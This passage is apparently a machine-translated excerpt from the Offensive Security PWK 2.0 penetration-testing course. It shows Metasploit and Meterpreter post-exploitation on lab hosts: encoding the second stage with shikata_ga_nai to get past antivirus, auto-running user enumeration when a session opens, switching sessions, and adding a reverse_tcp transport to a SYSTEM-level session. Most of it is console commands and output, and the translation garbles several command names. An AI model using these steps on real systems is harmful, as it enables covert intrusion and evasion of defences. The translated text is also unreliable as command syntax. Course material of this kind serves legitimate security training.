<div style="position:absolute;top:101188;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:102265;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:102265;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:102265;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">703</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101284;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">首先，让我们来看看一些高级编码选项。</font><font style="vertical-align: inherit;">在前面的例子中，我们选择</font></font></nobr></div>
<div style="position:absolute;top:101303;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对我们放入漏洞利用程序的shellcode的第一阶段进行编码。</font><font style="vertical-align: inherit;">从第二阶段开始</font></font></nobr></div>
<div style="position:absolute;top:101322;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 有效载荷要大得多并且包含更多潜在的签名，它可能</font></font></nobr></div>
<div style="position:absolute;top:101342;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被各种防病毒解决方案标记，因此我们也可以选择对第二阶段进行编码。</font></font></nobr></div>
<div style="position:absolute;top:101375;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EnableStageEncoding</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StageEncoder</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来编码第二阶段和</font></font></nobr></div>
<div style="position:absolute;top:101394;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可能绕过检测。</font><font style="vertical-align: inherit;">为此，我们将</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EnableStageEncoding</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置</font><font style="vertical-align: inherit;">为“true”并设置</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StageEncoder</font></font></i></nobr></div>
<div style="position:absolute;top:101413;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到我们想要的编码器，在这种情况下，“x86/shikata_ga_nai”：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101448;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 EnableStageEncoding true</font></font></font></b></nobr></div>
<div style="position:absolute;top:101465;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">EnableStageEncoding =&gt; 真</font></font></nobr></div>
<div style="position:absolute;top:101499;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 StageEncoder x86/shikata_ga_nai</font></font></font></b></nobr></div>
<div style="position:absolute;top:101516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">StageEncoder =&gt; x86/shikata_ga_nai</font></font></nobr></div>
<div style="position:absolute;top:101550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用 -j</font></font></font></b></nobr></div>
<div style="position:absolute;top:101567;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业 2 运行的漏洞利用。</font></font></nobr></div>
<div style="position:absolute;top:101601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 https://10.11.0.4:443 上启动 HTTPS 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:101635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:101652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] https://10.11.0.4:443 处理来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">使用 x86/shi 编码的舞台</font></font></nobr></div>
<div style="position:absolute;top:101669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kata_ga_nai</font></font></nobr></div>
<div style="position:absolute;top:101686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] https://10.11.0.4:443 处理来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">暂存 x86 有效负载 (18085</font></font></nobr></div>
<div style="position:absolute;top:101703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter 会话 4 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:443 -&gt; 10.11.0.22:51270)</font></font></nobr></div>
<div style="position:absolute;top:101737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:101756;left:333"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 782 - 使用 Metasploit 进行 StageEncoding</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:101785;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">该</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项也是非常有帮助的，因为它会自动运行的脚本时，</font></font></nobr></div>
<div style="position:absolute;top:101805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">建立meterpreter连接。</font><font style="vertical-align: inherit;">这在客户端攻击期间非常有用，因为我们可能</font></font></nobr></div>
<div style="position:absolute;top:101824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当用户执行我们的有效负载时不可用，这意味着会话可能闲置或丢失。</font></font></nobr></div>
<div style="position:absolute;top:101843;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如，我们可以配置 gather/enum_logged_on_users 模块自动</font></font></nobr></div>
<div style="position:absolute;top:101863;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当meterpreter连接时枚举登录用户：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:101898;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 AutoRunScript windows/gather/enum_logged_on_users</font></font></font></b></nobr></div>
<div style="position:absolute;top:101915;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">AutoRunScript =&gt; windows/gather/enum_logged_on_users</font></font></nobr></div>
<div style="position:absolute;top:101948;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">漏洞利用 -j</font></font></font></b></nobr></div>
<div style="position:absolute;top:101965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 作为后台作业运行的漏洞利用 3。</font></font></nobr></div>
<div style="position:absolute;top:102000;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 在 https://10.11.0.4:443 上启动 HTTPS 反向处理程序</font></font></nobr></div>
<div style="position:absolute;top:102033;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt; </font></font></nobr></div>
<div style="position:absolute;top:102050;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] https://10.11.0.4:443 处理来自 10.11.0.22 的请求；</font><font style="vertical-align: inherit;">暂存 x86 有效负载 (18082</font></font></nobr></div>
<div style="position:absolute;top:102067;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter session 5 打开</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(10.11.0.4:443 -&gt; 10.11.0.22:51275)</font></font></nobr></div>
<div style="position:absolute;top:102084;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 会话 ID 5 (10.11.0.4:443 -&gt; 10.11.0.22:51275)</font></font><b><font color="#00b050"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">处理 AutoRunScript 'windows</font></font></font></b></nobr></div>
</span></font>
<font size="3" color="#00b050" face="Times"><span style="font-size:11px;font-family:Times;color:#00b050">
<div style="position:absolute;top:102101;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/gather/enum_logged_on_users'</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102118;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 对抗会话 5</font></font></nobr></div>
<div style="position:absolute;top:102152;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当前登录的用户</font></font></nobr></div>
<div style="position:absolute;top:102169;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">====================</font></font></nobr></div>
<div style="position:absolute;top:102203;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">标准识别码    </font></font></nobr></div>
<div style="position:absolute;top:102203;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用户 </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:102343;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="87"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 87 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:102376;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:103453;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:103453;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:103453;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">704</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102472;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---    </font></font></nobr></div>
<div style="position:absolute;top:102472;left:506"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----</font></font></nobr></div>
<div style="position:absolute;top:102488;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-21-3048852426-3234707088-723452474-1103 corp\offsec</font></font></nobr></div>
<div style="position:absolute;top:102505;left:117"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">S-1-5-21-3426091779-1881636637-1944612440-1001 CLIENT251\admin</font></font></nobr></div>
<div style="position:absolute;top:102522;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">………………</font></font></nobr></div>
<div style="position:absolute;top:102542;left:265"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 783 - Meterpreter 在会话创建时执行模块</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:102571;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">到目前为止，我们已经使用各种内置命令在 Meterpreter 会话中导航，但是我们</font></font></nobr></div>
<div style="position:absolute;top:102591;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">也可以暂时退出 meterpreter shell 以在 Metasploit 内部执行其他操作</font></font></nobr></div>
<div style="position:absolute;top:102610;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">框架，无需关闭连接。</font><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">后台</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回</font></font></nobr></div>
<div style="position:absolute;top:102629;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msfconsole 提示，我们可以在其中执行框架内的其他操作。</font><font style="vertical-align: inherit;">当我们准备好时</font></font></nobr></div>
<div style="position:absolute;top:102649;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">返回到我们的 Meterpreter 会话，我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">session -l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和 jump</font><font style="vertical-align: inherit;">列出所有可用的会话</font></font></nobr></div>
<div style="position:absolute;top:102668;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">session -i</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> (interact) 后跟相应的 Id</font><font style="vertical-align: inherit;">返回到我们的会话，</font><font style="vertical-align: inherit;">如清单所示</font></font></nobr></div>
<div style="position:absolute;top:102687;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">784.</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:102722;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景</font></font></font></b></nobr></div>
<div style="position:absolute;top:102739;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 背景会议 5...</font></font></nobr></div>
<div style="position:absolute;top:102773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -l</font></font></font></b></nobr></div>
<div style="position:absolute;top:102807;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">活跃期</font></font></nobr></div>
<div style="position:absolute;top:102824;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">================</font></font></nobr></div>
<div style="position:absolute;top:102858;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID 名称类型    </font></font></nobr></div>
<div style="position:absolute;top:102858;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息    </font></font></nobr></div>
<div style="position:absolute;top:102858;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系</font></font></nobr></div>
<div style="position:absolute;top:102875;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">---- ---- ----    </font></font></nobr></div>
<div style="position:absolute;top:102875;left:392"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-----------    </font></font></nobr></div>
<div style="position:absolute;top:102875;left:660"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">----------</font></font></nobr></div>
<div style="position:absolute;top:102892;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5    </font></font></nobr></div>
<div style="position:absolute;top:102892;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter x86/windows NT AUTHORITY\SYSTEM @ WIN10-X86 10.11.0.4:4444 -&gt;</font></font></nobr></div>
<div style="position:absolute;top:102909;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.0.22:50344 (10.11.0.22)</font></font></nobr></div>
<div style="position:absolute;top:102943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话 -i 5</font></font></font></b></nobr></div>
<div style="position:absolute;top:102960;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 开始与 5 人互动...</font></font></nobr></div>
<div style="position:absolute;top:102994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">仪表盘 &gt; </font></font></nobr></div>
<div style="position:absolute;top:103013;left:257"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 784 - 在 Metasploit 框架中的会话之间进行更改</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用这些命令，我​​们可以在不同受感染主机上的可用 shell 之间切换</font></font></nobr></div>
<div style="position:absolute;top:103062;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">无需关闭我们的任何连接。</font></font></nobr></div>
<div style="position:absolute;top:103095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在前面的示例中，我们使用了预定义的通信协议（如 TCP 或 HTTPS）</font></font></nobr></div>
<div style="position:absolute;top:103114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用我们在生成有效载荷时选择的目标。</font><font style="vertical-align: inherit;">但是，我们可以使用</font></font></nobr></div>
<div style="position:absolute;top:103133;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们最初的妥协之后，</font><font style="vertical-align: inherit;">Meterpreter 有效载荷</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输</font></font></i><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">716</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以切换协议。</font><font style="vertical-align: inherit;">我们可以列出</font></font></nobr></div>
<div style="position:absolute;top:103153;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输列表</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的 meterpreter 连接的当前可用传输</font><font style="vertical-align: inherit;">。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103188;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输列表</font></font></font></b></nobr></div>
<div style="position:absolute;top:103204;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话到期：@ 2019-10-09 17:01:44</font></font></nobr></div>
<div style="position:absolute;top:103239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID Curr URL    </font></font></nobr></div>
<div style="position:absolute;top:103256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- --- ---    </font></font></nobr></div>
<div style="position:absolute;top:103273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 * http://10.11.0.4:4444/gFojKgv3qFbA1MHVmlpPUgxwS_f66dxGRl8ZqbZZTkyCuJFjeAaDK/</font></font></nobr></div>
<div style="position:absolute;top:103292;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 785 - 列出可用的传输</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:103403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">716 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Rapid7，2016），https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Transport-Control</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:103531;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="88"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 88 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:103564;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:104641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:104641;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:104641;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">705</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:103660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们还可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">transport add</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">向当前会话添加新的传输协议，使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-t</font></font></font></b></nobr></div>
<div style="position:absolute;top:103679;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置所需的传输类型。</font></font></nobr></div>
<div style="position:absolute;top:103712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在下面的例子中，我们将添加</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">reverse_tcp</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输，这相当于选择</font></font></nobr></div>
<div style="position:absolute;top:103731;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">windows/meterpreter/reverse_tcp 有效载荷。</font><font style="vertical-align: inherit;">我们将为指定的传输应用选项</font></font></nobr></div>
<div style="position:absolute;top:103751;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类型，包括本地主机 IP 地址 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ) 和本地端口 ( </font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-p</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> )：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:103786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输添加 -t reverse_tcp -l 10.11.0.4 -p 5555</font></font></font></b></nobr></div>
<div style="position:absolute;top:103802;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 添加新的传输...</font></font></nobr></div>
<div style="position:absolute;top:103820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[+] 成功添加 reverse_tcp 传输。</font></font></nobr></div>
<div style="position:absolute;top:103854;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">传输列表</font></font></font></b></nobr></div>
<div style="position:absolute;top:103870;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">会话到期：@ 2019-10-09 17:01:44</font></font></nobr></div>
<div style="position:absolute;top:103904;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ID Curr URL    </font></font></nobr></div>
<div style="position:absolute;top:103921;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--- --- ---    </font></font></nobr></div>
<div style="position:absolute;top:103938;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1 * http://10.11.0.4:4444/gFojKgv3qFbA1MHVmlpPUgxwS_f66dxGRl8ZqbZZTkyCuJFjeAaDK/  </font></font></nobr></div>
<div style="position:absolute;top:103955;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2    </font></font></nobr></div>
<div style="position:absolute;top:103955;left:190"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">tcp://10.11.0.4:5555    </font></font></nobr></div>
<div style="position:absolute;top:103975;left:278"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 786 - 向 meterpreter 会话添加一个新的传输</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:104004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在我们可以利用新的传输之前，我们必须设置一个监听器来接受</font></font></nobr></div>
<div style="position:absolute;top:104023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">联系。</font><font style="vertical-align: inherit;">我们将再次选择 multi/handler 模块并指定相同的</font></font></nobr></div>
<div style="position:absolute;top:104043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们之前选择的参数。</font></font></nobr></div>
<div style="position:absolute;top:104076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">随着配置的处理程序，我们可以回到Meterpreter就会会话和运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运输下一</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对</font></font></nobr></div>
<div style="position:absolute;top:104095;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">更改为新创建的传输模式。</font><font style="vertical-align: inherit;">这将创建一个新会话并关闭</font></font></nobr></div>
<div style="position:absolute;top:104114;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">旧的。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:104149;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Meterpreter &gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">背景</font></font></font></b></nobr></div>
<div style="position:absolute;top:104166;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[*] 背景会议 5...</font></font></nobr></div>
<div style="position:absolute;top:104200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（windows/http/syncbreeze_bof）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 multi/handler</font></font></font></b></nobr></div>
<div style="position:absolute;top:104234;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置有效载荷 windows/meterpreter/reverse_tcp</font></font></font></b></nobr></div>
<div style="position:absolute;top:104251;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有效载荷 =&gt; windows/meterpreter/reverse_tcp</font></font></nobr></div>
<div style="position:absolute;top:104285;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LHOST 10.11.0.4</font></font></font></b></nobr></div>
<div style="position:absolute;top:104302;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LHOST =&gt; 10.11.0.4</font></font></nobr></div>
<div style="position:absolute;top:104336;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">msf5 漏洞利用（多/处理程序）&gt;</font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">设置 LPORT 5555</font></font></font></b></nobr></div>
<div style="position:absolute;top:104353;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">左端口 =&gt; 5555</font></font></nobr></div>
